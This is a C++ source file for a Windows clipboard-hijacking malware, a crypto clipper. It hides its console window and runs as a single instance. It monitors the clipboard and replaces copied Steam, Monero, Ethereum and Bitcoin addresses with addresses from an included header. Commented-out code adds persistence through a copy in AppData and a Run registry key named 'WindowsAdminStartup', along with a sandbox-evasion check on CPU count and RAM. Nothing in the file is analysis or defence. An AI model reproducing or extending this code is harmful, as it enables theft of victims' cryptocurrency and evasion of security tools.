#include <iostream>
#include <windows.h>
#include <regex>
#include <string>
#include <sysinfoapi.h>
#include "ESCl.h"
#include <winnt.h>
#include <filesystem>

namespace fs = std::filesystem;


#define FILE_NAME "ESCl.exe"
#define MUTEX "cxD9r+mql"



SYSTEM_INFO sysinfo;
DWORD currentCLPB = 0;
HGLOBAL hglb;
std::string NewCLPB;
TCHAR szPATH[MAX_PATH];
DWORD pathLen = 0;


/*void Persist()
{
    char* appdataBuffer = nullptr;
    size_t appdataSize = 0;
    _dupenv_s(&appdataBuffer, &appdataSize, "appdata");

    pathLen = GetModuleFileName(NULL, szPATH, MAX_PATH); //get current path
    //std::string newPath = std::string(appdataBuffer) + '\\' + FILE_NAME;
    //std::string currPath = std::string(szPATH) + FILE_NAME;
    fs::path newPath = std::string(appdataBuffer) + "\\Microsoft\\"  + FILE_NAME;
    fs::path currPath = std::string(szPATH) + '\\' + FILE_NAME;

    //fs::path startupPath = std::string(appdataBuffer) + '\\' + "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + FILE_NAME;
 
    HKEY hkey;
    DWORD pathLenInBYTES = pathLen * sizeof(*szPATH);
    CopyFile(FILE_NAME, newPath.string().c_str(), FALSE);       //C:\Users\Antek\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
   // CopyFile(FILE_NAME, startupPath.string().c_str(), FALSE);
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hkey) == ERROR_SUCCESS) //HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    {
        if (RegSetValueExA(hkey, TEXT("WindowsAdminStartup"), 0, REG_SZ, (BYTE*)newPath.string().c_str(), pathLenInBYTES) == ERROR_SUCCESS)
        {
            RegCloseKey(hkey);
        }
    }
  



}

*/




void Replace(std::string s, std::string ns){ //Replace clipboard content


    hglb = GlobalAlloc(GMEM_FIXED, s.length() + 1); //alloc mem
    if(hglb)
    {
        memcpy(hglb,ns.c_str() ,ns.length() + 1);
        EmptyClipboard();
        SetClipboardData(CF_TEXT, hglb);
    }
 


}


/*bool isSandboxed()
{
    GetSystemInfo(&sysinfo);
    //ULONGLONG ram;
    //DWORD cpu;
    //BOOL CheckRam = GetPhysicallyInstalledSystemMemory(&ram);
    //BOOL CheckCpu = GetLogicalProcessorInformationEx(RelationProcessorCore,NULL,&cpu);

    int cpu = sysinfo.dwNumberOfProcessors;
    MEMORYSTATUSEX ram;
    ram.dwLength = sizeof(ram);
    GlobalMemoryStatusEx(&ram);



    if(cpu < 2 || ram.ullTotalPhys < 3906250)
    {
        return true;
    }
    else
    {
        return false;
    }



}*/

void ClipboardMonitor()
{
    CreateMutex(FALSE, FALSE, MUTEX);
    while (true)
    {
        Sleep(100);
        if (currentCLPB != GetClipboardSequenceNumber())
            //std::cout << "[+] " << GetClipboardSequenceNumber() << std::endl;
        {
            if (OpenClipboard(NULL) != 0)
            {
                std::string text = (char*)GetClipboardData(CF_TEXT);
                //std::cout << "Opened CLPB! ---> " << text << std::endl;
                if (text.length() > 0)
                {
                    if (std::regex_match(text, STreg) != 0)
                    {
                        //std::cout << "STEAM" << std::endl;
                        NewCLPB = std::regex_replace(text, STreg, STaddr);               //STEAM
                        Replace(text, NewCLPB);

                    }
                    else if (std::regex_match(text, XMRreg))
                    {
                        //std::cout << "XMR" << std::endl;
                        NewCLPB = std::regex_replace(text, XMRreg, XMRaddr);             //XMR
                        Replace(text, NewCLPB);

                    }
                    else if (std::regex_match(text, ETHreg))
                    {
                        //std::cout << "ETH" << std::endl;
                        NewCLPB = std::regex_replace(text, ETHreg, ETHaddr);            //ETH
                        Replace(text, NewCLPB);

                    }
                    else if (std::regex_match(text, BTCreg))
                    {
                        //std::cout << "BTC" << std::endl;
                        NewCLPB = std::regex_replace(text, BTCreg, BTCaddr);            //BTC
                        Replace(text, NewCLPB);
                    }
                }
            }
        }
        currentCLPB = GetClipboardSequenceNumber();
        CloseClipboard();

    }
}


/*int CheckandRun()
{
    if (isSandboxed() == true)
    {
        return 0;

    }
    else {

        ClipboardMonitor();

    }

}
*/




int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpStr, int winShow)
{

    if (OpenMutex(MUTEX_ALL_ACCESS, FALSE, MUTEX))
    {
        return 0;
    }



    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);   
    ShowWindow(stealth, SW_HIDE); 
   /* if (RegGetValue(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), TEXT("WindowsAdminStartup"), RRF_RT_REG_SZ, NULL, NULL ,NULL) == ERROR_SUCCESS)
    {
        CheckandRun();
    }
    else {
        Persist();
        CheckandRun();
    }
   */
    ClipboardMonitor();

    return 0;



}










